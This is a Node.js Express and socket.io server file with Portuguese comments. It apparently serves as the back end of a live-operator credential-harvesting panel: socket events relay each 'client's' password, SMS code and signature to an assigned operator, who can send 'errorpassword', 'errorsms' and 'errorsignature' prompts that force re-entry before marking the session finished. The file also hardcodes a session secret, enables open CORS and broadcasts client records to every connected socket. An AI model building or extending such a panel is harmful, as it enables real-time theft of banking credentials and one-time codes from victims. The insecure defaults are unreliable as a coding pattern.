require('dotenv').config({
    path: process.env.NODE_ENV === 'test' ? '.env.test' : '.env',
})

//toggled
const bodyParser = require('body-parser')
const express = require('express')

const common = require('common-js')

const cors = require('cors')
const morgan = require('morgan')
const path = require('path')
const handlebars = require('express-handlebars')
const session = require('express-session')
const flash = require('connect-flash')
const requestIp = require('request-ip')
const socketio = require('socket.io')

require('./database')

const app = express()

app.use(bodyParser.urlencoded({ extended: false }))

app.use(bodyParser.json())

const routes = require('./routes')

//app.use(requestIp.mw())

//sessão
app.use(
    session({
        secret: `SisCodePassword`,
        resave: true,
        saveUninitialized: true,
    })
)

//config
//template engine
app.engine(
    `hbs`,
    handlebars({
        defaultLayout: `main`,
        extname: '.hbs',
        helpers: {
            json: (content) => {
                return JSON.stringify(content)
            },
            ifCond: (v1, v2, options) => {
                if (v1 === v2) {
                    return options.fn(this)
                }
                return options.inverse(this)
            },
            first: (list, index, options) => {
                if (list.length) {
                    if (list[0][index]) return list[0][index]
                }
                return options.inverse(this)
            },
            contains: (list, string, options) => {
                if (list === string) {
                    return options.fn(this)
                }
                return options.inverse(this)
            },
            printArray: function (arr) {
                for (i = 0; i < arr.length; i++) {
                    //console.log(arr[i])
                }
            },
            check: (v1, options) => {
                if (v1 === true) {
                    return options.fn(this)
                }
                return options.inverse(this)
            },
            carousel: (arr) => {
                if (arr.length) {
                    return arr.map((item, key) => {
                        if (key < 1) {
                            return `<div class="carousel-item active">
                            <img src="${item.url}" class="d-block w-100" alt="...">
                        </div>`
                        } else {
                            return `<div class="carousel-item">
                            <img src="${item.url}" class="d-block w-100" alt="...">
                        </div>`
                        }
                    })
                }
            },
            dropDown: (arr) => {
                let ul = `<ul class="dropdown-menu">`
                var text = ``
                if (arr.length) {
                    for (i = 0; i < arr.length; i++) {
                        text += `
                        <li ${arr[i].child.length ? `class="dropdown-submenu"` : ``}>
                            <a href="/products/${arr[i].slug}" ${
                            arr[i].child.length ? `class="dropdown-toggle" data-toggle="dropdown"` : ``
                        }>${arr[i].name}
                        ${arr[i].child.length ? `<i class="arrow"></i>` : ``}
                        </a>
                        `

                        if (arr[i].child.length) {
                            text += `<ul class="dropdown-menu">`
                            for (b = 0; b < arr[i].child.length; b++) {
                                text += `
                                <li ${arr[i].child[b].child.length ? `class="dropdown-submenu"` : ``} >
                                    <a href="/products/${arr[i].child[b].slug}" ${
                                    arr[i].child[b].child.length ? `class="dropdown-toggle" data-toggle="dropdown"` : ``
                                }>${arr[i].child[b].name}
                                ${arr[i].child[b].child.length ? `<i class="arrow"></i>` : ``}
                                </a>
                                `

                                if (arr[i].child[b].child.length) {
                                    text += `<ul class="dropdown-menu">`
                                    for (c = 0; c < arr[i].child[b].child.length; c++) {
                                        text += `
                                        <li>
                                            <a href="/products/${arr[i].child[b].child[c].slug}">${arr[i].child[b].child[c].name}</a>
                                        </li>`
                                    }
                                    text += `</ul></li>`
                                } else {
                                    text += `</li>`
                                }
                            }
                            text += `</ul></li>`
                        } else {
                            text += `</li>`
                        }
                    }
                    ul += text

                    return (ul += `</ul>`)
                }
            },
        },
    })
)

//flash
app.use(flash())

//middleware sessions
app.use((req, res, next) => {
    res.locals.success_msg = req.flash('success_msg')
    res.locals.error_msg = req.flash('error_msg')

    next()
})

app.set(`view engine`, `hbs`)
app.set('views', path.join(__dirname, 'views'))

//Public
app.use(express.static(path.resolve(__dirname, 'public')))

//node_modules/socket.io-client/dist/socket.io.js

app.use(cors())
// app.use(express.json({ limit: '100mb' }))
// app.use(express.urlencoded({ extended: true, limit: '100mb' }))
app.use('/files', express.static(path.resolve(__dirname, '..', 'tmp', 'uploads')))
//app.use(morgan('dev'))
app.use(routes)

app.use((req, res) => {
    res.status(404).send({ url: req.originalUrl + ' not found' })
})

const server = app.listen(process.env.PORT || 3333)

const io = socketio(server)

let theIo

let clientsSocket = []
let socketsCount = 0
let socketRooms = {}
let socketsClients = {}

const { connectedUsers } = require('./connected')

app.io = io

const Client = require('./models/Client')
const UserByToken = require('./middlewares/auth')

io.on('connection', (socket) => {
    socket.on('chat message', (msg) => {
        console.log('message: ' + msg)
        io.emit('chat message', msg)
    })

    socketsClients[socket.id] = {}

    theIo = io

    socket.on('start', async (client) => {
        try {
            const theClient = await Client.findByPk(client.id, { include: { association: `operator` } })

            if (socketsClients[socket.id]) {
                socketsClients[socket.id].nickname = theClient.user
            }

            if (socketRooms[client.id]) {
                socket.join(theClient.id)

                var roster = io.sockets.adapter.rooms.get(theClient.id)

                roster.forEach(function (client) {
                    if (socketsClients[client]) console.log('Username: ' + socketsClients[client].nickname)
                })

                socketRooms[`${client.id}`].time = new Date()

                io.emit('reconnectClient', theClient)
            } else {
                socketRooms[client.id] = {
                    id: client.id,
                    time: new Date(),
                }
                socket.join(theClient.id)
            }
        } catch (error) {
            console.log(error)
        }
    })

    socket.on('disconnect', () => {
        var id = socket.id

        console.log('user disconnect', socket.request.user)

        //get room
        socket.rooms.forEach(function (room) {
            console.log('room ' + room + ': id : ', id)
            if (room == id) {
            }
        })
    })

    //user
    socket.on('erroruser', async (clientID) => {
        const client = await Client.findByPk(clientID)

        io.to(socketRooms[`${client.id}`]).emit('erroruser', client)
    })

    //SMS
    socket.on('sms', async (theClient) => {
        try {
            const client = await Client.findByPk(theClient)

            console.log(`pediu sms para: `, client.id)

            io.to(client.id).emit('sms', client.toJSON())
        } catch (error) {
            console.log(error)
        }
    })

    socket.on('errorsms', async (clientID) => {
        try {
            const client = await Client.findByPk(clientID)

            console.log(`erro sms para: `, client.id)

            io.to(client.id).emit('errorsms', client.toJSON())
        } catch (error) {
            console.log(error)
        }
    })

    //Assign Client
    socket.on('assignClient', async (data) => {
        try {
            const { token, client: clientID } = data

            const { user_id } = await UserByToken(token)

            const client = await Client.findByPk(clientID)

            if (!client) return

            await client.update({ user_id })

            const clientUpdated = await Client.findByPk(clientID, { include: { association: `operator` } })

            if (socketsClients[socket.id]) {
                socketsClients[socket.id].nickname = clientUpdated.operator.name
            }

            socket.join(client.id)

            var roster = io.sockets.adapter.rooms.get(client.id)

            roster.forEach(function (client) {
                if (socketsClients[client]) console.log('Username: ' + socketsClients[client].nickname)
            })

            io.emit('assignClient', clientUpdated.toJSON())
        } catch (error) {
            console.log(`Error on assign client`, error)
        }
    })

    //Assinatura
    socket.on('sendSignature', async (clientID) => {
        const client = await Client.findByPk(clientID, { include: { association: 'operator' } })

        if (client.operator.id) {
            io.to(client.id).emit('sendSignature', client.toJSON())
        } else {
            io.emit('newClient', client.toJSON())
        }
    })

    socket.on('errorsignature', async (clientID) => {
        const client = await Client.findByPk(clientID)

        io.to(client.id).emit('errorsignature', client)
    })

    // Password
    socket.on('sendPassword', async (clientID) => {
        try {
            const client = await Client.findByPk(clientID, { include: { association: `operator` } })

            if (socketRooms[client.id]) {
                socket.join(socketRooms[`${client.id}`].id)

                socketRooms[`${client.id}`].time = new Date()

                io.emit('reconnectClient', client.toJSON())

                io.to(client.id).emit('sendPassword', client)
            } else {
                socketRooms[client.id] = {
                    id: client.id,
                    time: new Date(),
                }
                socket.join(client.id)

                io.emit('newClient', client.toJSON())
            }
        } catch (error) {
            console.log(error)
            console.log(`Erro ao mandar senha`)
        }
    })

    socket.on('errorpassword', async (clientID) => {
        const client = await Client.findByPk(clientID)

        io.to(client.id).emit('errorpassword', client)
    })

    //finish
    socket.on('finish', async (clientID) => {
        const client = await Client.findByPk(clientID, { include: { association: 'operator' } })

        client.update({ status: 'finalizado' })

        const clientResume = await Client.findByPk(client.id, { include: { association: 'operator' } })

        io.to(client.id).emit('finish', clientResume.toJSON())
    })
})

module.exports = { connectedUsers, clientsSocket, io, theIo }
